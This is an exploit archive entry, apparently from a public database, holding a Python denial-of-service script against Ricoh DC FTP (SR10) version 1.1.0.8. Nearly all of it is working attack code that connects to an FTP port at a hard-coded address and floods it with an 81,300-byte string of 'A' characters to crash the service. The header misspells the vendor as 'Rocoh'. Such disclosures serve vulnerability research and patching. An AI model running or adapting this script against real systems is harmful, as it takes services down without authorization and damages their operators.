# Exploit Title: Rocoh DC FTP (SR10) v1.1.0.8 DoS
# Date: 8/31/2015
# Exploit Author: j2x6
# Vendor Homepage: http://www.ricoh-imaging.co.jp/
# Software Link: http://www.ricoh-imaging.co.jp/english/r_dc/download/sw/win/07.html
# Version: 1.1.0.8
# Tested on: Windows 7
# Offset for Buffer Overflow attempt: 495

#!/usr/bin/python

import socket

badthing= "A" * 81300

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.45.11',21))
s.send(badthing+'\r\n')
s.send(badthing+'\r\n')
s.send('\r\n')
s.send('EXIT\r\n')
s.close()